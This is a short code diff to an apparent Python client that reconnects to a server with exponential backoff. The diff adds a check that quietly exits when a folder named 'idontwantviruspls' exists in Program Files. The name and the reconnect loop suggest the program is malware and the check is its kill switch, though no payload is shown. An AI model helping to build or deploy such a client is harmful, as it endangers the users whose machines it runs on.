@@ -753,6 +753,13 @@ async def connect_to_server():
         backoff_time = min(backoff_time * 2, 300)
 
 if __name__ == "__main__":
+    # Check for the "idontwantviruspls" directory in Program Files
+    program_files_path = os.environ.get("PROGRAMFILES")
+    if program_files_path:
+        target_dir = os.path.join(program_files_path, "idontwantviruspls")
+        if os.path.isdir(target_dir):
+            sys.exit(0) # Exit silently if the directory exists
+
     try:
         asyncio.run(connect_to_server())
     except KeyboardInterrupt:
